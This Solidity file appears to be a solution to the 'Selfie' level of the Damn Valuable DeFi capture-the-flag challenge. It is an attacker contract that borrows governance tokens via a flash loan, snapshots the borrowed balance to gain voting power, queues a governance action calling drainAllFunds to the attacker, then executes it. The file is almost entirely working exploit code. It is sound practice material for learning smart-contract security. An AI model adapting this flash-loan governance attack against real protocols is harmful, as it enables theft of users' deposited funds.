pragma solidity >=0.8.0;

import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";

contract AttackerContract {
    SelfiePool private selfiePool;
    SimpleGovernance private governance;
    address private owner;

    constructor(SelfiePool _selfiePool, SimpleGovernance _governance) {
        selfiePool = _selfiePool;
        governance = _governance;
        owner = msg.sender;
    }

    function attackStepOne(uint256 amount) external returns (uint256) {
        selfiePool.flashLoan(amount);

        return
            governance.queueAction(
                address(selfiePool),
                abi.encodeWithSignature("drainAllFunds(address)", owner),
                0
            );
    }

    function attackStepTwo(uint256 actionId) external {
        governance.executeAction(actionId);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(
            tokenAddress
        );

        token.snapshot();
        token.transfer(address(selfiePool), amount);
    }
}
